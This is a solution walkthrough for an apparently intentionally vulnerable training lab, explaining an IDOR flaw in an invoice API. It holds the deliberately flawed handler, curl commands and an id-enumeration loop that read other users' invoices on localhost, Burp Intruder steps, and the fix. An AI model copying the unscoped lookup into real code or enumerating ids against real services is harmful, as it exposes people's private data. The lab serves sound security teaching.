# Ledgerly: Solution / Walkthrough

![CWE-639](https://img.shields.io/badge/CWE--639-IDOR-red?style=flat-square)
![Node](https://img.shields.io/badge/Node-Express-blue?style=flat-square&logo=node.js&logoColor=white)
![Docker](https://img.shields.io/badge/Lab-Docker-2496ED?style=flat-square&logo=docker&logoColor=white)

**Ledgerly is an intentionally vulnerable application built for security education.** It contains a deliberate [IDOR / broken access control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
(CWE-639) flaw so you can practice finding and exploiting it in a safe and controlled environment.

<br>

> [!WARNING]
> This page gives away the exploit and the flag. If you want to solve it yourself, start with the non-spoiler **[Learning Guide](GUIDE.md)** and come back here to check your work.

<br>

## 📚 What you'll get from this page

The [Learning Guide](GUIDE.md) covers *what* broken access control is and *how*
to approach the lab. This page is the spoiler half: the confirmed exploit, the
flag, and — most importantly — the **why** behind the bug and its fix. By the
end you should be able to:

- Read a snippet of an API handler and point to the exact missing check.
- Reproduce the exploit by hand, understanding every part of the request.
- Explain **why** each fix works — and why some "obvious" fixes don't.

> **One-line recap** (full version in the [GUIDE](GUIDE.md)): an IDOR happens
> when an app fetches an object by a client-supplied id and returns it without
> checking the object belongs to the caller. Here, logging in is treated as
> enough.

If you only want the request, jump to [Exploitation](#-exploitation) — but the
real value is in the *why*.

<br>

## 🐛 The vulnerability

The invoice detail route in `src/routes.ts` looks like this:

```ts
router.get('/api/invoices/:id', requireLogin, async (req, res) => {
  const id = Number(req.params.id);                 // attacker controls this
  if (!Number.isInteger(id) || id < 1) {
    res.status(400).json({ error: 'invalid invoice id' });
    return;
  }

  const [invoice] = await db
    .select()
    .from(invoices)
    .where(eq(invoices.id, id))                      // looked up by id ONLY
    .limit(1);

  if (!invoice) {
    res.status(404).json({ error: 'invoice not found' });
    return;
  }

  // ⚠️ MISSING OWNERSHIP CHECK — the intentional vulnerability.
  res.json({ invoice });                             // returns anyone's invoice
});
```

Walk through it the way the server does:

1. `requireLogin` ensures there **is** a session — that's authentication. It
   says nothing about *which* invoices you may read.
2. `id` comes **straight from the URL path** — fully attacker-controlled.
3. The query filters by `invoices.id = id` and **nothing else**. There is no
   `AND owner_id = <session user>`.
4. The handler returns whatever row matched. Any logged-in user can read any
   invoice by changing the number in the URL.

Compare it with the **listing** route right above it, which *is* scoped
correctly:

```ts
// GET /api/invoices  — the safe one
.where(eq(invoices.ownerId, req.session.userId!))   // scoped to YOU
```

> **Why does it look safe?** Two reasons. First, the endpoint is behind a login,
> so it *feels* protected — but authentication is not authorization. Second, the
> dashboard only ever lists your own invoices, so a normal user never sees
> anyone else's id and the gap stays invisible until someone changes the number
> by hand. The dangerous code looks like ordinary, reasonable code.

<br>

## 💥 Exploitation

You log in as **alice** (`password123`). Her dashboard lists invoices with ids
`1` and `2`. The seeded data also contains invoices for other users — and one of
them carries the flag.

**The intended request** — reading one of your own invoices:

```
GET /api/invoices/1
```

Returns alice's own invoice. Working as designed.

**The exploit** — ask for an id that isn't yours:

```
GET /api/invoices/4
```

Invoice `4` belongs to **bob**, not alice — but the server hands it over anyway.

With `curl`, using a cookie jar to hold the session:

```bash
# 1) Log in as alice and save the session cookie.
curl -s -c jar.txt -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"password123"}' \
  http://localhost:3000/api/login

# 2) Your own invoice (baseline) — works, it's yours.
curl -s -b jar.txt http://localhost:3000/api/invoices/1

# 3) The exploit — read bob's invoice by id. Not yours, returned anyway.
curl -s -b jar.txt http://localhost:3000/api/invoices/4
```

Expected output (step 3), with the flag in the invoice note:

```json
{
  "invoice": {
    "id": 4,
    "ownerId": 2,
    "number": "INV-2007",
    "client": "Vertex Capital",
    "amount": "18790.00",
    "currency": "EUR",
    "status": "sent",
    "notes": "Confidential settlement memo — do not share. FLAG{LEDGERLY_BALANCE_EXPOSED}"
  }
}
```

> **Where does the flag come from?** It is **not** in the repo on purpose — it is
> baked into the Docker image at build time (`ARG FLAG`) and the seed writes it
> into bob's `INV-2007` note (`ownerId: 2`, invoice id `4`). You have to actually
> break access control against the running app to read it; you can't grep the
> source.

<br>

## 🚀 Going further

The only gate is "are you logged in?", so the exposure isn't one record — it's
the whole table. Enumerate the id space and you harvest every customer's data:

```bash
for id in $(seq 1 10); do
  echo "== invoice $id =="
  curl -s -b jar.txt "http://localhost:3000/api/invoices/$id"
  echo
done
```

In a real engagement this is exactly how a single IDOR turns into a full data
breach: one loop over sequential ids dumps every user's private records.

<br>

## 🛠️ Doing it in Burp Suite

Prefer a proxy-driven workflow? This mirrors a real engagement:

1. Proxy your browser through Burp and load <http://localhost:3000>. Log in as
   `alice`.
2. Open one of your own invoices from the viewer box — capture the
   `GET /api/invoices/1` request in **Proxy > HTTP history**.
3. Send it to **Repeater**. Re-send the original id to get a **baseline**
   response you can compare against.
4. Change the path id to `4` and send. A different invoice body — a client and
   amount that aren't alice's, plus the flag note — confirms the IDOR.
5. (Optional) Send the request to **Intruder**, mark the numeric id as the
   payload position, and run a numeric range (e.g. `1–50`). Sorting by response
   length instantly reveals every readable record — the automated version of the
   `curl` loop above.

> Testing IDOR well means having **two identities**. Keep a second account's
> session handy so you can prove a resource that belongs to B is reachable while
> authenticated as A — that contrast is the proof of a broken authorization
> check.

<br>

## 🛡️ The fix

The correct implementation adds the missing **ownership check**: after loading
the invoice, verify it belongs to the authenticated user before returning it.

```ts
const [invoice] = await db
  .select()
  .from(invoices)
  .where(eq(invoices.id, id))
  .limit(1);

// Authorization: the object must belong to the caller.
if (!invoice || invoice.ownerId !== req.session.userId) {
  // 404 (not 403) so we don't reveal that the id exists but belongs to
  // someone else — don't leak existence.
  res.status(404).json({ error: 'invoice not found' });
  return;
}

res.json({ invoice });
```

Why this works, step by step:

- **Authorize, not just authenticate.** Being logged in is necessary but not
  sufficient; every object access re-checks ownership.
- **Fail closed.** If it isn't yours, return nothing.
- **Don't leak existence.** Returning `404` (rather than `403`) for someone
  else's id means an attacker can't even confirm which ids exist.

### ⚠️ Tempting fixes that *don't* work

Part of learning is knowing which "fixes" are traps:

- **Switching sequential ids for UUIDs.** Harder-to-guess ids are *security by
  obscurity*, not authorization. If the endpoint still returns any id it's
  handed, a leaked or logged UUID is just as exploitable. (Guessability is a
  real concern at **[Level 4 (cartora)](https://github.com/iv0ks/cartora)** —
  but even there it is never the *fix*.)
- **Hiding the invoice from the UI.** The dashboard already lists only your
  invoices, and that changed nothing — the API is the real boundary. Never rely
  on the frontend to enforce access.
- **Checking only that the user is logged in.** That's what the broken code
  already does. Authentication ≠ authorization; the ownership check is the point.

### ✅ Even better: enforce it at the source and systematically

- **Scope the query itself:** `WHERE id = :id AND owner_id = :me`. The database
  returns nothing for someone else's id, so the check can't be forgotten in the
  handler body.
- **Centralise authorization:** an ownership/policy middleware or a data-access
  layer that *always* takes the caller's identity makes "forgot the check" a
  structural impossibility rather than a per-route discipline.
- **Test with two identities** in CI so a regression that re-opens the IDOR
  fails the build.

<br>

## 🎓 Key takeaways

If you remember five things from this lab, make it these:

1. **The sink is "client-supplied id → fetch object → return it, no owner
   check."** Train your eye to spot it in any detail/read endpoint.
2. **Authentication is not authorization.** A login gate does not decide *which*
   objects you may touch.
3. **Authorize every object access.** Check ownership (or policy) on the server,
   every time, and fail closed.
4. **Obscurity isn't a control.** UUIDs and hidden UI elements don't replace an
   authorization check.
5. **Scope at the source.** `AND owner_id = :me` in the query — or a policy
   layer — makes the vulnerability structurally hard to reintroduce.

That's Level 1 — the baseline read IDOR. Next in the series,
**[pingboard (Level 2)](https://github.com/iv0ks/pingboard)** moves from
*reading* someone else's object to *modifying* it — a write IDOR. Head back to
the **[Learning Guide](GUIDE.md)** for the method, or the **[README](README.md)**
for the lab setup.
